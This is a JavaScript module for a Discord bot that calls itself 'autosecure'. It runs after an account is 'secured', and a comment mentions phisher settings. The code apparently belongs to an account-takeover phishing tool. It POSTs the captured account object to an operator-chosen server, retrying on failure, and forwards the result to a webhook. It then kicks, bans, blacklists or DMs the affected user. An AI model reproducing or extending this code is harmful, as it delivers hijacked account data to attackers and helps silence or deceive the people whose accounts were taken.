const { queryParams } = require('../../../db/db');
const validEmail = require('../emails/validEmail');
const { isvalidwebhook, isUrl } = require('../process/helpers');
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const axios = require('axios');

async function aftersecure(msg, shouldaftersecure, userId, settings, client, server_id, user, email, acc) {
    console.log('[AFTERSECURE] Starting with parameters:', {
        shouldaftersecure,
        userId,
        server_id,
        user,
        email: email ? 'REDACTED' : null,
        hasSettings: !!settings
    });

    if (!shouldaftersecure) {
        console.log('[AFTERSECURE] Skipping - shouldaftersecure is false');
        return false;
    }


  //  console.log(`Aftersecure received msg: ${JSON.stringify(msg)}`)



  /*
    Post in edit phisher/autosecure settings
  */

    if (settings.postserver && isUrl(settings.postserver)) {
        let attempts = 0;
        let success = false;

        while (attempts < 3 && !success) {
            try {
                await axios.post(settings.postserver, acc, {
                    headers: {
                        "Content-Type": "application/json",
                        "sender": "oldwardautosecure"
                    }
                });
                success = true;
            } catch (error) {
                attempts++;
                console.error(`Failed to post to server (attempt ${attempts}): ${error}`);
                if (attempts < 3) {
                    await new Promise(resolve => setTimeout(resolve, 1000 * attempts)); 
                }
            }
        }
    }



    if (settings.webhook && (await isvalidwebhook(settings.webhook))) {
        try {
            await sendToWebhook(settings.webhook, msg);
        } catch (error) {
            console.error('Failed to send to webhook:', error);
            await handlefailedaftersecure(client, `Failed to send to webhook: ${error.message}`);
        }
    }


    if (settings.blacklistemails && email) {
        try {
        //    console.log(`Automatically adding email to blacklist!`);
            await addBlacklistemail(client, email);
        } catch (error) {
            console.error('Failed to blacklist email:', error);
            await handlefailedaftersecure(client, `Failed to blacklist email`);
        }
    }

    const { aftersecure: afterSecureState } = settings;

    if (!afterSecureState) {
        console.log("[AFTERSECURE] No after-secure state set.");
        return false;
    }

    console.log('[AFTERSECURE] Processing after-secure state:', afterSecureState);

    try {
        let parsedState;
        if (typeof afterSecureState === 'string' && afterSecureState.startsWith('{')) {
            parsedState = JSON.parse(afterSecureState);
        } else {
            parsedState = { type: afterSecureState };
        }

        const { type, value } = parsedState;

        switch (type) {
            case 'dmpreset':
             //   console.log(`dm preset:`)
                return await handledmpreset(userId, value, client, server_id);
            case 'kick':
                return await kickUser(userId, client, server_id);
            case 'ban':
                return await banUser(userId, client, server_id);
            case 'role':
                if (value) {
                    return await assignRole(userId, value, client, server_id);
                }
                console.error("Role ID is missing for 'role' after-secure state.");
                await handlefailedaftersecure(client, "Missing the role to give the user, report this!");
                return false;
            case 'dm':
                if (value) {
                    return await sendDM(userId, value, client, server_id);
                }
                console.error("Message is missing for 'dm' after-secure state.");
                await handlefailedaftersecure(client, "Missing the message to dm the user, report this!");
                return false;
            case 'nothing':
                console.log("No action taken for after-secure state: nothing.");
                return true;
            case 'blacklist':
                return await addBlacklist(client, userId);
            case 'blacklistemail':
                if (!email) {
                    await handlefailedaftersecure(client, "Missing the email to blacklist, report this!");
                    return false;
                }
                return await addBlacklistemail(client, email);
            default:
                console.error(`Unknown after-secure state: ${type}`);
                await handlefailedaftersecure(client, `Unknown aftersecure type, report this!`);
                return false;
        }
    } catch (error) {
        console.error("Error processing after-secure state:", error);
        await handlefailedaftersecure(client, `Failed (unknown error)`);
        return false;
    }
}

async function handledmpreset(userId, presetname, client, server_id) {
    try {

        const guild = await client.guilds.fetch(server_id).catch(() => null);
        if (!guild) {
            throw new Error('Guild not found');
        }

        const member = await guild.members.fetch(userId).catch(() => null);
        if (!member) {
            throw new Error('User not found in server');
        }

   
        const preset = await client.queryParams(
            "SELECT * FROM presets WHERE user_id=? AND name=?",
            [client.username, presetname]
        );

        if (!preset || preset.length === 0) {
            throw new Error(`Preset "${presetname}" not found`);
        }

        const presetData = preset[0];
        const user = await client.users.fetch(userId).catch(() => null);
        if (!user) {
            throw new Error('User not found');
        }

        let responseOptions = {};
        
        // Handle preset message (embed)
        if (presetData.preset) {
            try {
                const embedJson = JSON.parse(presetData.preset);
                const embed = new EmbedBuilder(embedJson);
                responseOptions.embeds = [embed];
            } catch (error) {
                console.error('Failed to parse preset embed:', error);
                throw new Error('Invalid embed format in preset');
            }
        }

        // Handle button if available
        if (presetData.buttonlabel && presetData.buttonlink) {
            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setLabel(presetData.buttonlabel)
                    .setURL(presetData.buttonlink)
                    .setStyle(ButtonStyle.Link)
            );
            responseOptions.components = [row];
        }

        // Send the DM
        await user.send(responseOptions);
        console.log(`Successfully sent DM preset "${presetname}" to user ${userId}`);
        return true;
    } catch (error) {
        console.error(`Failed to send DM preset to user ${userId}:`, error);
        await handlefailedaftersecure(client, `Failed to send DM preset to user ${userId}: ${error.message}`);
        return false;
    }
}

async function kickUser(userId, client, server_id) {
    try {
        console.log(`Attempting to kick user ${userId} from server ${server_id}`);
        const guild = await client.guilds.fetch(server_id);
        if (!guild) {
            throw new Error('Guild not found');
        }

        const member = await guild.members.fetch(userId).catch(() => null);
        if (!member) {
            throw new Error('User not found in server');
        }

        if (!member.kickable) {
            throw new Error('Bot lacks permissions to kick this user');
        }

        await member.kick();
        console.log(`Successfully kicked user ${userId}`);
        return true;
    } catch (error) {
        console.error(`Failed to kick user ${userId}:`, error);
        await handlefailedaftersecure(client, `Failed to kick user ${userId}: ${error.message}`);
        return false;
    }
}

async function banUser(userId, client, server_id) {
    try {
        console.log(`Attempting to ban user ${userId} from server ${server_id}`);
        const guild = await client.guilds.fetch(server_id);
        if (!guild) {
            throw new Error('Guild not found');
        }

        const member = await guild.members.fetch(userId).catch(() => null);
        if (!member) {
            throw new Error('User not found in server');
        }

        if (!member.bannable) {
            throw new Error('Bot lacks permissions to ban this user');
        }

        await member.ban();
        console.log(`Successfully banned user ${userId}`);
        return true;
    } catch (error) {
        console.error(`Failed to ban user ${userId}:`, error);
        await handlefailedaftersecure(client, `Failed to ban user ${userId}: ${error.message}`);
        return false;
    }
}

async function assignRole(userId, roleId, client, server_id) {
    try {
        console.log(`Attempting to assign role ${roleId} to user ${userId} in server ${server_id}`);
        const guild = await client.guilds.fetch(server_id);
        if (!guild) {
            throw new Error('Guild not found');
        }

        const member = await guild.members.fetch(userId).catch(() => null);
        if (!member) {
            throw new Error('User not found in server');
        }

        const role = guild.roles.cache.get(roleId);
        if (!role) {
            throw new Error(`Role ${roleId} not found`);
        }

        if (!member.manageable) {
            throw new Error('Bot lacks permissions to manage this user');
        }

        if (member.roles.cache.has(roleId)) {
            console.log(`User ${userId} already has role ${roleId}`);
            return true;
        }

        await member.roles.add(role);
        console.log(`Successfully assigned role ${roleId} to user ${userId}`);
        return true;
    } catch (error) {
        console.error(`Failed to assign role to user ${userId}:`, error);
        await handlefailedaftersecure(client, `Failed to assign role to user ${userId}: ${error.message}`);
        return false;
    }
}

async function sendDM(userId, message, client, server_id) {
    try {
        console.log(`Attempting to send DM to user ${userId}`);
        
        // Verify user is in server first
        const guild = await client.guilds.fetch(server_id).catch(() => null);
        if (!guild) {
            throw new Error('Guild not found');
        }

        const member = await guild.members.fetch(userId).catch(() => null);
        if (!member) {
            throw new Error('User not found in server');
        }

        const user = await client.users.fetch(userId);
        if (!user) {
            throw new Error('User not found');
        }

        // Try to parse as embed JSON, fallback to plain text
        try {
            const embedJson = JSON.parse(message);
            const embed = new EmbedBuilder(embedJson);
            await user.send({ embeds: [embed] });
        } catch {
            // Not valid JSON, send as plain message
            await user.send(message);
        }

        console.log(`Successfully sent DM to user ${userId}`);
        return true;
    } catch (error) {
        console.error(`Failed to send DM to user ${userId}:`, error);
        await handlefailedaftersecure(client, `Failed to send DM to user ${userId}: ${error.message}`);
        return false;
    }
}

async function addBlacklistemail(client, email) {
    try {
        if (!validEmail(email)) {
            throw new Error('Invalid email format');
        }

        const exists = await client.queryParams(
            `SELECT 1 FROM blacklistedemails WHERE client_id = ? AND email = ?`,
            [client.username, email]
        );

        if (exists.length > 0) {
            console.log("Email already blacklisted");
            return true;
        }

        await client.queryParams(
            `INSERT INTO blacklistedemails (client_id, email) VALUES (?, ?)`,
            [client.username, email]
        );

        return true;
    } catch (error) {
        console.error('Error inserting email into blacklist:', error);
        await handlefailedaftersecure(client, `Failed to blacklist email: ${error.message}`);
        return false;
    }
}

async function handlefailedaftersecure(client, reason) {
    try {
        let ownerid = client.username;
        let botnumber = client.botnumber;
        
        const mainsettings = await queryParams(
            `SELECT * FROM autosecure WHERE user_id=? AND botnumber=?`,
            [ownerid, botnumber]
        );

        if (!mainsettings || mainsettings.length === 0) {
            return;
        }

        const settings = mainsettings[0];
        const [channelId, guildId] = settings.logs_channel?.split("|") || [];

        if (!channelId || !guildId) {
            return;
        }

        const embed = new EmbedBuilder()
            .setTitle("After-secure failed")
            .setColor(0xff0000)
            .setDescription(reason)
            .setTimestamp();

        const guild = await client.guilds.fetch(guildId);
        const channel = await guild.channels.fetch(channelId);
        
        if (channel) {
            await channel.send({ embeds: [embed] });
        }
    } catch (err) {
        console.error('Failed to send after-secure failure message:', err);
    }
}

async function addBlacklist(client, userId) {
    try {
        const clientId = client.username;
        const exists = await client.queryParams(
            `SELECT 1 FROM blacklisted WHERE client_id = ? AND user_id = ?`,
            [clientId, userId]
        );

        if (exists.length > 0) {
            console.log(`User ${userId} already blacklisted`);
            return true;
        }

        await client.queryParams(
            `INSERT INTO blacklisted (client_id, user_id) VALUES (?, ?)`,
            [clientId, userId]
        );
        
        console.log(`User ${userId} successfully blacklisted`);
        return true;
    } catch (error) {
        console.error(`Failed to blacklist user ${userId}:`, error);
        await handlefailedaftersecure(client, `Failed to blacklist user ${userId}: ${error.message}`);
        return false;
    }
}

async function sendToWebhook(webhookUrl, msg) {
    try {
        const cleanMessage = {
            content: msg.content || null,
            embeds: msg.embeds ? msg.embeds.map(embed => ({
                title: embed.title || null,
                description: embed.description || null,
                url: embed.url || null,
                color: embed.color || null,
                fields: embed.fields ? embed.fields.map(field => ({
                    name: field.name || '',
                    value: field.value || '',
                    inline: field.inline || false
                })) : [],
                timestamp: embed.timestamp || null,
                footer: embed.footer ? {
                    text: embed.footer.text || '',
                    icon_url: embed.footer.icon_url || null
                } : null,
                image: embed.image ? { url: embed.image.url || null } : null,
                thumbnail: embed.thumbnail ? { url: embed.thumbnail.url || null } : null,
                author: embed.author ? {
                    name: embed.author.name || '',
                    url: embed.author.url || null,
                    icon_url: embed.author.icon_url || null
                } : null
            })) : []
        };

        if (cleanMessage.embeds && cleanMessage.embeds.length === 0) {
            delete cleanMessage.embeds;
        }

        const finalPayload = JSON.parse(JSON.stringify(cleanMessage, (key, value) => {
            return value === null ? undefined : value;
        }));

        await axios.post(webhookUrl, finalPayload, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        console.log('Successfully sent to webhook');
        return true;
    } catch (error) {
        console.error('Failed to send to webhook:', error.message);
        throw error;
    }
}

module.exports = aftersecure;